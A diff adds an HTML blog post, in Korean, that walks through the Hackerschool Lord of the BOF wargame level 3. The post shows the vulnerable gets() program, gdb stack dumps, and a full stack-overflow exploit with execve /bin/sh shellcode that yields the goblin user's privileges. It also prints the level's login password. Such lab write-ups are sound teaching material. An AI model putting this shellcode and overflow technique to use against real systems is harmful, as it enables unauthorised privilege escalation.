@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame]  해커스쿨 BoF LEVEL3 (cobolt -> goblin) : small buffer + stdin</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 BoF LEVEL3 (cobolt -&gt; goblin) : small buffer + stdin | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 BoF LEVEL3 (cobolt -&gt; goblin) : small buffer + stdin" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = cobolt pw = hacking exposed" />
+<meta property="og:description" content="id = cobolt pw = hacking exposed" />
+<link rel="canonical" href="http://localhost:4000/2015-11-01/hackerschool-BoF-stage-3/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-01/hackerschool-BoF-stage-3/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-01T17:30:00+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = cobolt pw = hacking exposed","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-01/hackerschool-BoF-stage-3/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 BoF LEVEL3 (cobolt -&gt; goblin) : small buffer + stdin","dateModified":"2015-11-01T17:30:00+09:00","datePublished":"2015-11-01T17:30:00+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-01/hackerschool-BoF-stage-3/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame]  해커스쿨 BoF LEVEL3 (cobolt -> goblin) : small buffer + stdin</div>
+  <span class="post-date">
+    <time>01 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = cobolt</li>
+  <li>pw = hacking exposed</li>
+</ul>
+
+<!--more-->
+
+<h2 id="문제--goblinc">문제 : goblin.c</h2>
+
+<p>16 bytes small buffer 이며, 외부 입력을 command line argument 가 아니라 stdin 으로 받는 <code class="highlighter-rouge">gets()</code> 가 사용됨.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - goblin
+        - small buffer + stdin
+*/</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="gdb-디버깅-시-stdin-입력하는-방법">GDB 디버깅 시 stdin 입력하는 방법</h2>
+
+<p>이번 문제는 stdin 으로 입력을 넣는데, gdb 로 어떻게 디버깅을 해야하는지 몰랐다.</p>
+
+<p><a href="http://stackoverflow.com/questions/8422259/gdb-debugging-with-piped-input-not-arguments">gdb - debugging with piped input (not arguments)</a></p>
+
+<p><code class="highlighter-rouge">stdin</code> 입력을 추가 파일로 저장을 한 후 gdb 실행 한 다음에 <code class="highlighter-rouge">run &lt; input_file</code> 형식으로 실행을 한다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb ./vuln_prog
+run &lt; filename_with_input
+</code></pre></div></div>
+
+<p>Stack 확인하기 위하여 <code class="highlighter-rouge">AA</code> 을 20bytes 를 넣고</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>cobolt@localhost cobolt]<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*20'</span> <span class="o">&gt;</span> test.in
+
+<span class="o">[</span>cobolt@localhost cobolt]<span class="nv">$ </span>xxd test.in
+0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
+0000010: 9090 9090 0a                             .....
+</code></pre></div></div>
+
+<p>GDB 로 붙여서 LR 을 확인해보자. <code class="highlighter-rouge">0xbffffb1c</code> 에 LR 에 저장된 위치임. 이 값에 뒤에 넣은 shellcode 로 jump 할 위치로 바꾸어주면 된다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span>main+15
+Breakpoint 2 at 0x8048407: file goblin.c, line 10.
+<span class="o">(</span>gdb<span class="o">)</span> r &lt; test2.in
+The program being debugged has been started already.
+Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
+Starting program: /home/cobolt/./goblin2 &lt; test2.in
+
+Breakpoint 2, 0x8048407 <span class="k">in </span>main <span class="o">()</span> at goblin.c:10
+10          gets<span class="o">(</span>buffer<span class="o">)</span><span class="p">;</span>
+<span class="o">(</span>gdb<span class="o">)</span> x/50x <span class="nv">$esp</span>
+0xbffffb04:     0xbffffb08      0x90909090      0x90909090      0x90909090
+0xbffffb14:     0x90909090      0x90909090      0xbffffb34      0x90909090
+0xbffffb24:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffb34:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffb44:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffb54:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffb64:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffb74:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffb84:     0x315e18eb      0x074688c0      0x89087689      0x0bb00c46
+0xbffffb94:     0x4e8d1e8d      0x0c568d08      0xe3e880cd      0x2fffffff
+0xbffffba4:     0x2f6e6962      0xbf006873      0xbffffded      0xbffffdf8
+0xbffffbb4:     0xbffffe09      0xbffffe1a      0xbffffe22      0x00000000
+0xbffffbc4:     0x00000003      0x08048034
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NOP <span class="o">(</span>20<span class="o">)</span> + LR <span class="o">(</span>4<span class="o">)</span> + <span class="s2">"</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf"</span> + NOP<span class="o">(</span>100<span class="o">)</span> + ShellCode
+
+<span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*20 + "\x34\xfb\xff\xbf" + "\x90"*100 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p>여기서 또 하나의 문제는 미리 만들어 놓은 값을 <code class="highlighter-rouge">stdin</code> 으로 실행파일에 넣어주는 형식이다.  (사실 실제로 해보면 이런 내용이 가장 어렵다. 해보지 않으면 절대 알 수 없는 내용이다.)</p>
+
+<h3 id="stdin-입력">stdin 입력</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print "XXXXX"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./goblin
+</code></pre></div></div>
+
+<h3 id="command-line-입력">command line 입력</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./executable <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "XXXXX"'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<h2 id="최종-실행">최종 실행</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>cobolt@localhost cobolt]<span class="nv">$ </span>/bin/bash2
+<span class="o">[</span>cobolt@localhost cobolt]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*20 + "\x34\xfb\xff\xbf" + "\x90"*100 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./goblin
+4^1F嵬bin/sh
+id
+<span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>cobolt<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>cobolt<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>503<span class="o">(</span>goblin<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>503<span class="o">(</span>goblin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>502<span class="o">(</span>cobolt<span class="o">)</span>
+
+my-pass
+euid <span class="o">=</span> 503
+hackers proof
+</code></pre></div></div>
+
+<h3 id="final-exploit">Final exploit</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*20 + "\x34\xfb\xff\xbf" + "\x90"*100 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./goblin
+</code></pre></div></div>
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
